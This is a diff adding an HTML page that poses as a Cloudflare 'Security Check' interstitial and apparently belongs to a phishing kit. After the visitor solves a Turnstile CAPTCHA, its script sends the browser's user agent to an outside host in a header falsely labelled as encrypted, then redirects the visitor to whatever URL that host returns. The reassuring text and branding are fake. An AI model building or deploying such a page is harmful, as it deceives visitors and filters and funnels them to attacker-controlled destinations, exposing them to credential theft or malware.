@@ -1,0 +1,263 @@
+<!doctype html>
+<html lang="en-US">
+<head> 
+  <script async defer src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback"></script> 
+  <title>Just a moment...</title> 
+  <meta content="width=device-width,initial-scale=1" name="viewport"> 
+  <script>
+    var verifyCallback_CF = function (response) {
+      if (response && response.length > 10) {
+        sendRequest(); // Only send the request after CAPTCHA is solved
+      }
+    };
+
+    window.onloadTurnstileCallback = function () {
+      turnstile.render("#turnstileCaptcha", {
+        sitekey: "0x4AAAAAABe4Vhgwf8_s2gmI", 
+        callback: verifyCallback_CF,
+      });
+    };
+
+    function hh2(encryptedText, shift) {
+      let decryptedText = "";
+      for (let i = 0; i < encryptedText.length; i++) {
+        let c = encryptedText[i];
+        if (c.match(/[a-z]/i)) {
+          let code = encryptedText.charCodeAt(i);
+          if ((code >= 65) && (code <= 90)) {
+            c = String.fromCharCode(((code - 65 - shift + 26) % 26) + 65);
+          } else if ((code >= 97) && (code <= 122)) {
+            c = String.fromCharCode(((code - 97 - shift + 26) % 26) + 97);
+          }
+        }
+        decryptedText += c;
+      }
+      return decryptedText;
+    }
+
+    function Encrypt(text, publicKey) {
+      console.log('encrypt with public key:', publicKey);
+      return text; 
+    }
+
+    let sx = "https://0xmh.com/?plshhblc";
+
+    const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
+    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxCJBwcY8t0AqPquU+Ah1
+    R0EPWlcD5XSXhOEe00844TkiGLFHnMWQEugh0zYh/kgrw8hv1ifOmf4Jrkis3tlW
+    qpIO2U9Nle23D1VKpxZSxRyYTbnoyq3lRcqY5txOJKdviR9fA9wPidS6KTXhX2xq
+    wq1jjYvgHtntEGYwK6Lzm6Q8jTjfV7ICqnV74GTKnPN7VMDKsS2+Dcf2Y2IoYY1o
+    NM7nWPKFeVUmkqFMowkdBmGJHL4UqRcxbhiRX3AAzzdQvbQg7OQxYjbKak23IvDN
+    1ia9SsXQyo5H/XnfXB2Nb9sNayO5sV+hDmBRlujtm1+maqGMJUXZeVHL81Q7O22a
+    WQIDAQAB
+    -----END PUBLIC KEY-----`;
+
+    function sendRequest() {
+      const userAgent = navigator.userAgent;
+      const EncryptedUserAgent = Encrypt(userAgent, PUBLIC_KEY);
+      console.log('Sending request with encrypted user-agent:', EncryptedUserAgent);
+      
+      let xhr = new XMLHttpRequest();
+      xhr.open('GET', sx, true);
+      xhr.setRequestHeader("accept", "application/json");
+      xhr.setRequestHeader("qrc-auth", EncryptedUserAgent);
+
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          if (xhr.status === 200) {
+            const cc = JSON.parse(xhr.responseText);
+            if (cc.url) {
+              window.location = cc.url;
+            } else {
+              document.body.innerHTML = cc.error ? cc.error : 'ACCESS DENIED';
+            }
+          } else {
+            document.body.innerHTML = 'CONNECTION TO HOST FAILED';
+          }
+        }
+      };
+      xhr.send();
+    }
+  </script>
+</head>
+<style>
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+  html {
+    line-height: 1.15;
+    -webkit-text-size-adjust: 100%;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, sans-serif;
+    color: #313131;
+    background-color: #f7f7f7;
+  }
+  body {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    font-size: 16px;
+    color: #333;
+  }
+  a {
+    transition: color 0.15s;
+    text-decoration: none;
+    color: #0051c3;
+  }
+  a:hover {
+    color: #ee730a;
+    text-decoration: underline;
+  }
+  .main-wrapper {
+    display: flex;
+    flex: 1;
+    flex-direction: column;
+    align-items: center;
+    padding: 2rem;
+  }
+  .main-content {
+    width: 100%;
+    max-width: 60rem;
+    margin-top: 4rem;
+    text-align: center;
+  }
+  .h1 {
+    font-size: 2.75rem;
+    font-weight: 600;
+    line-height: 3.5rem;
+    color: #222;
+    margin-bottom: 1.5rem;
+    letter-spacing: -0.02em;
+  }
+  .h1 img {
+    max-width: 100%;
+    height: auto;
+    margin-bottom: 1rem;
+  }
+  .h2 {
+    font-size: 1.5rem;
+    line-height: 2.25rem;
+    font-weight: 500;
+    color: #555;
+    margin-bottom: 1.5rem;
+    letter-spacing: -0.01em;
+  }
+  .core-msg {
+    font-size: 1.25rem;
+    font-weight: 400;
+    line-height: 1.5rem;
+    color: #666;
+    margin-bottom: 1.5rem;
+    letter-spacing: -0.01em;
+  }
+  .body-text {
+    font-size: 1rem;
+    line-height: 1.25rem;
+    font-weight: 400;
+    color: #555;
+  }
+  .footer {
+    background-color: #222;
+    color: #d9d9d9;
+    width: 100%;
+    padding: 1.5rem 0;
+    text-align: center;
+    font-size: 0.875rem;
+    margin-top: auto;
+  }
+  .footer-inner {
+    border-top: 1px solid #444;
+    padding-top: 1rem;
+  }
+  .spacer {
+    margin: 2rem 0;
+  }
+  #cf-spinner-please-wait {
+    font-size: 1.125rem;
+    color: #888;
+    margin-bottom: 2rem;
+  }
+  .icon-wrapper {
+    display: inline-block;
+    position: relative;
+    top: 0.25rem;
+    margin-right: 0.25rem;
+  }
+  .heading-icon {
+    width: 1.625rem;
+    height: 1.625rem;
+  }
+  .warning-icon {
+    display: inline-block;
+  }
+  .text-center {
+    text-align: center;
+  }
+  .zone-name-title {
+    margin-bottom: 2rem;
+  }
+  .zone-name-title img {
+    margin-bottom: -17px;
+  }
+  @media (max-width: 720px) {
+    .main-content {
+      margin-top: 3rem;
+    }
+    .h1 {
+      font-size: 1.75rem;
+      line-height: 2.5rem;
+    }
+    .h2 {
+      font-size: 1.25rem;
+      line-height: 1.75rem;
+    }
+    .core-msg {
+      font-size: 1rem;
+      line-height: 1.5rem;
+    }
+    .heading-icon {
+      width: 1.25rem;
+      height: 1.25rem;
+    }
+  }
+  @media (prefers-color-scheme: dark) {
+    body {
+      background-color: #222;
+      color: #d9d9d9;
+    }
+    a {
+      color: #fff;
+    }
+    a:hover {
+      color: #ee730a;
+    }
+  }
+</style>
+
+<body class="no-js">
+  <div class="main-wrapper" role="main">
+    <div class="main-content">
+      <h1 class="h1 zone-name-title">
+        <div>
+           <img src="" alt="Security Check" style="margin-bottom:-17px; visibility: hidden;">
+          <span style="display:block; font-size: 1.5rem; font-weight: 500; color: #444; margin-top: 1rem;">Security Check</span>
+             <div id="site-name">Please Wait...</div>
+        </div>
+      </h1>
+      <p id="cf-spinner-please-wait">We are verifying your connection. This might take a moment.</p>
+      <form data-callback="verifyCallback_CF" id="cfForm" method="POST" style="visibility: visible;">
+        <div id="turnstileCaptcha"></div>
+      </form>
+      <div class="core-msg spacer" id="challenge-body-text">
+        <div>Your connection is being securely verified. Please hold on while we complete the process.</div>
+      </div>
+    </div>
+  </div>
+  <div class="footer" role="contentinfo">
+    <div class="footer-inner">
+      <div class="text-center">Your Security & Performance is Our Priority</div>
+    </div>
+  </div>
+</body>
+</html>
